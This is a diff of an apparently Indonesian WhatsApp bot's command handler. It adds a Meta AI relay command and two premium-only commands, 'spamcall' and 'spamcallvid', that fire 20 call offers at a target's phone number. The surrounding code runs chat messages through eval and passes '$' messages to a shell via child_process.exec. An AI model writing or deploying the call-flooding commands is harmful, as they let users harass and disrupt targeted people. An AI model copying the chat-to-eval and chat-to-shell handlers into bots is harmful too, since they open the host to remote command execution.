          let res = await tiktok(qtext);          
          if (res && res.data && res.data.data) {
             let images = res.data.data.images || [];
@@ -860,6 +1051,58 @@ case 'tiktok':
         }
       }
       break
+      
+// END
+//META AI CASE
+
+case 'meta-ai': {
+  if (!qtext) return m.reply('Send Text / Question');
+            try {
+                const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
+                const response = await fetch(apiUrl);
+                const mark = await response.json();
+
+                const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';
+
+                await TamaRYC.sendMessage(m.chat, { text: ress }, {quoted:m});
+                
+} catch (error) {
+    console.error("Terjadi kesalahan segera hubungi developer!!!:", error.message);
+}
+}
+break
+
+//END
+// CASE SPAM CALL
+
+case 'spamcall': {
+if (!PremOnly) return 
+if (!q) return m.reply("Example Use.\n calloffer 62xx / @tag")
+isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(`*Success Send Spam Call To ${isTarget}*`)
+await sleep(1000)
+for (let i = 0; i < 20; i++) {
+await sendOfferCall(isTarget)
+}
+}
+break
+
+// VERSION VIDEO
+
+case 'spamcallvid': {
+if (!PremOnly) return 
+if (!q) return m.reply("Example Use.\n calloffervideo 62xx / @tag")
+isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(`*Success Send Spam Call Video To ${isTarget}*`)
+await sleep(1000)
+for (let i = 0; i < 20; i++) {
+await sendOfferVideoCall(isTarget)
+}
+}
+break
+
+//END
+//END
 //======================================================\\
 default:
 if (budy.startsWith('=>')) {
@@ -869,27 +1112,27 @@ sat = JSON.stringify(sul, null, 2)
 bang = util.format(sat)
 if (sat == undefined) {
 bang = util.format(sul)}
-return Reply1(bang)}
+return m.reply(bang)}
 try {
-Reply1(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
+m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
 } catch (e) {
-Reply1(String(e))}}
+m.reply(String(e))}}
 if (budy.startsWith('>')) {
 if (!DevOnly) return
 try {
 let evaled = await eval(budy.slice(2))
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
-await Reply1(evaled)
+await m.reply(evaled)
 } catch (err) {
-await Reply1(String(err))
+await m.reply(String(err))
 }
 }
 //=========================================================\\
 if (budy.startsWith('$')) {
 if (!DevOnly) return
 require("child_process").exec(budy.slice(2), (err, stdout) => {
-if (err) return Reply1(`${err}`)
-if (stdout) return Reply1(stdout)
+if (err) return m.reply(`${err}`)
+if (stdout) return m.reply(stdout)
 })
 }
 //========================================================\\
